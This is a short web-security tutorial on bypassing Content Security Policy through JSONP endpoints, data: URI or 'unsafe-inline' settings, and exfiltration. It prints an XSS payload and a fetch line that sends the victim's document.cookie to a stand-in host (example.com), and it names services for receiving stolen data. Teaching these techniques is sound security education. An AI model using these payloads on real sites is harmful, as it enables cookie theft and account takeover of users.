# Bypassing the Content Security Policy

## Overview
Since we now know how to create content security policies, let's learn how to find bypasses for them.

If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using Google's CSP Evaluator. It's able to detect various mistakes in any CSP configuration.

## JSONP Endpoints
Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. 

A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The JSONBee repo (https://github.com/zigoo0/JSONBee) lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.

## Unsafe CSP Configurations
Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: <script src="data:application/javascript,alert(1)"></script>

## Exfiltration
To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as Beeceptor to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.

If the website you're exploiting allows AJAX requests (via connect-src) to anywhere, you can create a fetch request to your server like so: <script>fetch(`http://example.com/${document.cookie}`)</script> When the script is triggered on the victim's machine, you'll see their cookies show up in your access log. 
